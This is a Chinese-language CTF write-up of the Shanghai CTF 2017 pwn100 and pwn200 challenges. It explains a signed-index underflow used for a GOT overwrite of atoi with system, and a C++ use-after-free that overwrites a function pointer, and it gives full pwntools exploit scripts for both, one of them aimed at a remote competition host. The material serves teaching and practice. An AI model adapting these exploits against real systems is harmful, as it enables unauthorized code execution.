---
title: 上海ctf2017 pwn100 && pwn200
authorId: hac425
tags:
  - heap
categories:
  - ctf
date: 2017-11-05 23:32:00
---
### 前言
尽量详细，给有需要的学弟们看看
分析的 idb 文件在这：

https://gitee.com/hac425/blog_data/tree/master/shanghaictf

### pwn100
程序是一个经典的 堆管理程序，基本增删改查功能。


![paste image](http://oy9h5q2k4.bkt.clouddn.com/15098962009599uzwpyqa.png?imageslim)

`add` 功能很正常，分配8字节的内存然后写入8字节内容。把 分配到的 `heap`指针存到 `table` 中，然后 `count++` 
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509896434623h6e9584f.png?imageslim)

我们调试看看，使用 `add` 功能然后 看看堆的内容

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15098965027379oqb1bwg.png?imageslim)

可以看到尽管 `malloc(8)` 实际会分配 `0x20` 字节（0x10 chunk结构 + 8 + 8 字节 对齐padding）
所以这里应该没有溢出的问题，但是注意 `count` 变量会索引到下一个没有使用的 `table` 表项。

这个程序的问题在于，在 `get_last`, `edit` 时会直接使用 `table[count] ` 来获取要处理的指针， 而且在 `delete` 时就只是简单的 `count--`,而且`count` 是一个有符号整数。这样多次 `delete` 后，`count` 会变成 负数。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509934315611x779r1bk.png?imageslim)

然后 通过`table[count] `（`*(table + count*8)`） ,这样我们就可以通过`get_last`, `edit`来 泄露内存和 修改内存了。


`ctf` 中利用漏洞的目标一般就是执行 `system('sh')`,在这里我们可以通过修改 `got` 表中`atoi`函数的指针为 `system` 的函数，然后在调用 `atoi` 函数时，就会去调用 `system` 函数了。为什么要选择 `atoi` 函数作为目标呢？

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15099347624636c7nenso.png?imageslim)
在打印程序的菜单后，会要我们输入一个选项，这就会调用这个函数，可以看到他会读取 `16` 字节到 `nptr`, 然后传到 `atoi`,如果我们把 `atoi` 改成`system`, 然后输入 `sh` , 就会执行 `system('sh')` 了，目标达到。

由于是这样获取内存地址： `*(table + count*8)`， 所以我们需要在 `table` 的上面（就是地址 < table的地址） 区域找到一个 指向 `got` 的指针。我们可以使用 `pwndbg` 的 `searchmem` 来搜索

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509935326266sve8pr7a.png?imageslim)

属于

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509935380746in5n7zt4.png?imageslim)

那么现在利用的思路就很清晰了。
 - 首先多次调用 `delete` 函数使得 `table + count*8` 指向 这里的 `atoi` 函数对应的地址，也就是 `0x400588`.

- 然后我们就可以通过 `get_last` 功能打印 `atoi` 函数的地址，通过`atoi` 在 `libc` 中的固定偏移，泄露 `libc` 的地址。

- 然后获取 `system` 函数地址，然后使用 `edit` 修改 `atoi` 函数的地址改成 `system`函数地址。然后输入`sh`  即可。

exp(要跑 20几分钟左右):

```
from pwn import *

# context.log_level = 'debug'
p = process("./list")

puts_plt = 0x602018


def add(content):
    p.recvuntil("5.Exit\n")
    p.sendline("1")
    p.recvuntil("Input your content:\n")
    sleep(0.5)
    p.sendline(content)


def get_last_content():
    p.recvuntil("5.Exit\n")
    p.sendline("2")
    p.recvuntil('4.Delete')
    p.recvuntil('5.Exit\n')
    content = p.recvuntil("5.Exit\n")
    addr = u64(content[:6].ljust(8, '\x00'))
    hexdump(content)
    hexdump(content)
    return addr


def edit(content):
    p.sendline("3")
    sleep(0.5)
    p.send(content)


def delete():
    p.recvuntil("5.Exit\n")
    p.sendline("4")

# alloc 3 chunk before to 3


def get_count_to_addr(addr):
    time = 0x602080 + 3 * 8 - addr
    time = time / 8

    print time
    for i in range(time):
        # sleep(0.5)
        delete()


gdb.attach(p)

add("B" * 8)
add("B" * 8)
add(p64(puts_plt))
pause()


get_count_to_addr(0x400588)

print "modify the count to fushu"
pause()

print "::::" * 10

atoi_addr = get_last_content()
libc_addr = atoi_addr - 0x36e80
system_addr = libc_addr + 0x45390

log.success("system: " + hex(system_addr))

edit(p64(system_addr))

log.success("modify atoi---> system")

p.sendline("sh")

p.interactive()


# bp 0x0400924


```



### pwn200
就是用`c++` 写的程序比较难看，不过看到程序的菜单，漏洞就很清楚了。
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509936031356ptc0dds9.png?imageslim)
提示的很明显了，应该是 `uaf`, 那我们就重点看看与内存分配相关的位置。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509936258753devxv5lf.png?imageslim)

首先会分配两个结构体，其中开始8字节被写入了函数的指针。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509936430537ciumch55.png?imageslim)
可以看到内存块的大小为 `0x40` 大小。通过 `new(0x30)` 分配得到，所以 `new` 和 `malloc` 的分配方式应该是一样的。接着往下看。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/150993658543336ohfyxh.png?imageslim)
选择`2` 时，可以有我们提供大小，传到 `new` ,然后通过 `read` 写入内容。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509936668993dl8aosz9.png?imageslim)


`free` 时会调用 `delete`  释放掉内存块。`free` 之后可以看到进入了`fastbin` 
![paste image](http://oy9h5q2k4.bkt.clouddn.com/15099367564697zfv0v57.png?imageslim)
那此时我们使用 `2` 号功能，连续分配两块 `48`(0x30) 字节的内存，就会拿到这两块内存了。


程序中内置了`getshell`函数

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509937226801kdjz5ggb.png?imageslim)

所以我们在拿到那两块内存后，把开始 8 字节写成 `getshell-8` 函数的地址就行了。（减8的原因看下图）
然后使用 `1` 功能，就能调用了。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509937318915n5tt0od8.png?imageslim)

exp中把 开始 8 字节改成了  `0x0602D50`
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509946173632ju0gczy8.png?imageslim)
exp:

```
from pwn import *

# p = process("./p200")
p = remote("106.75.8.58", 12333)
context.log_level = 'debug'

get_shell = p64(0x0602D50)

payload = get_shell
payload += "A" * (48 - len(payload))

# gdb.attach(p)
p.recvuntil("1. use, 2. after, 3. free\n")
p.sendline('3')
# 先释放掉那两个块
pause()

p.recvuntil("1. use, 2. after, 3. free\n")
p.sendline("2")
p.recvuntil("Please input the length:\n")
p.sendline("48")

sleep(0.5)

p.sendline(payload)
pause()

sleep(0.5)

p.recvuntil("1. use, 2. after, 3. free\n")
p.sendline("2")
p.recvuntil("Please input the length:\n")
p.sendline("48")
sleep(0.5)
p.sendline(payload)

# 分配两个块，占用刚刚释放的块， 开始8字节 为 0x0602D50
pause()

sleep(0.5)

p.sendline("1")
p.interactive()

```